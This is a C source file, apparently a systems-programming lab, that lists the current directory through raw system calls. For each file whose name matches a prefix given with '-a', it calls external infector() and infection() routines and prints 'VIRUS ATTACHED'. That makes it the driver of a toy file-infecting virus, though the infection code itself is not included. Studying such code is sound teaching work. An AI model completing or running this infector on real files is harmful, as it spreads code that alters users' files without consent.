#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define SYS_GETDENTS 141
#define SYS_CLOSE 6
#define O_RDONLY    00
#define O_DIRECTORY 0200000
#define O_RWX 0777

extern int system_call();
extern void infector(char *);
extern void infection();

struct linux_dirent{
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[];
};

int main (int argc , char* argv[], char* envp[]){
	int i;
	char buffer[8192];
	char* open_err = "Error: Unable to open directory\n";
	char* read_err = "Error: Unable to read directory\n";
	char* virus = " VIRUS ATTACHED\n";
	char* newline = "\n";
	int fd = system_call(SYS_OPEN, ".", O_RDONLY , O_RWX);
	int n = 0;
	char* prefix = "";
	struct linux_dirent *de;
	
	for (i = 0; i < argc; i++) {
		if (strlen(argv[i]) > 2 && strncmp(argv[i], "-a", 2) == 0) {
			prefix = argv[i] + 2;
		     }
	}
		    
	if(fd<0){
		system_call(SYS_WRITE, STDOUT, open_err, strlen(open_err));
		return 1;
	}
	
	while((n = system_call(SYS_GETDENTS,fd, (struct linux_dirent *)buffer, sizeof(buffer))) > 0){
		int offset = 0;
		while (offset < n) {
		    de = (struct linux_dirent *)(buffer + offset);
		    int should_infect = 0;
		    char *filename = de->d_name;
		    char filename_buffer[strlen(filename) + 1];
         		for (i = 0; i < strlen(filename); i++) {
              			  filename_buffer[i] = filename[i];
           	 	}
           		 filename_buffer[strlen(filename)] = '\0'; 
           		if (strlen(prefix) != 0){
		    should_infect = (strncmp(filename_buffer,prefix,strlen(prefix)) == 0);
			}
			
		    if (should_infect) {
		    				
			infector(filename_buffer);
		        infection();
		        system_call(SYS_WRITE, STDOUT, filename_buffer, strlen(filename_buffer));
		        system_call(SYS_WRITE, STDOUT, virus, 16);
		    } else {
		        system_call(SYS_WRITE, STDOUT, filename_buffer, strlen(filename_buffer));
		        system_call(SYS_WRITE, STDOUT, newline, 1);
		    }
		    

		    offset += de->d_reclen;
		}
    
	}
	
	if (n < 0){
		system_call(SYS_WRITE, STDOUT, read_err , strlen(read_err));
		return 1;
	}
	
	system_call(SYS_CLOSE, fd);
	

	return 0;
}









